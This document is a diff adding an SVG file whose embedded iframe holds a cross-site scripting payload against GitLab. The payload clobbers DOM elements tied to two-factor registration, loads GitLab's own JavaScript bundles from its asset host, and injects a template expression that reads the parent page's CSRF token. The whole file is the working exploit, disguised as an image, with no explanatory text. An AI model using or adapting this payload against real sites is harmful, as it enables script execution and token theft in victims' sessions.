@@ -1,0 +1,10 @@
+<?xml version="1.0"?>  
+<svg xmlns="http://www.w3.org/2000/svg">  
+  <defs>  
+    <g id="main">  
+      <foreignObject>  
+        <iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="&lt;base href=https://assets.gitlab-static.net/assets/webpack/&gt;&lt;form id=gon&gt;&lt;input name=u2f&gt;&lt;/form&gt;&lt;br id=js-register-token-2fa&gt;&lt;p id=js-register-token-2fa-setup&gt;${alert(parent.document.querySelector('meta[name=csrf-token]').outerHTML)}&lt;/p&gt;&lt;script src=runtime.a6eee683.bundle.js&gt;&lt;/script&gt;&lt;script src=main.40ed7f48.chunk.js&gt;&lt;/script&gt;&lt;script src=commons-globalSearch-pages.admin.abuse_reports-pages.admin.application_settings.ci_cd-pages.admin.gr-f196c612.69ea2ffd.chunk.js&gt;&lt;/script&gt;&lt;script src=commons-pages.admin.sessions-pages.groups.omniauth_callbacks-pages.ldap.omniauth_callbacks-pages.omn-c3aaf8c4.5768d554.chunk.js&gt;&lt;/script&gt;&lt;script src=commons-pages.profiles-pages.profiles.accounts.show-pages.profiles.billings-pages.profiles.keys-page-6145ef8e.b9c7e4f8.chunk.js&gt;&lt;/script&gt;&lt;script src=commons-pages.profiles.accounts.show-pages.profiles.two_factor_auths.170fd497.chunk.js&gt;&lt;/script&gt;&lt;script src=pages.profiles.two_factor_auths.01996eaa.chunk.js&gt;&lt;/script&gt;"></iframe>  
+      </foreignObject>  
+    </g>  
+  </defs>  
+</svg>  
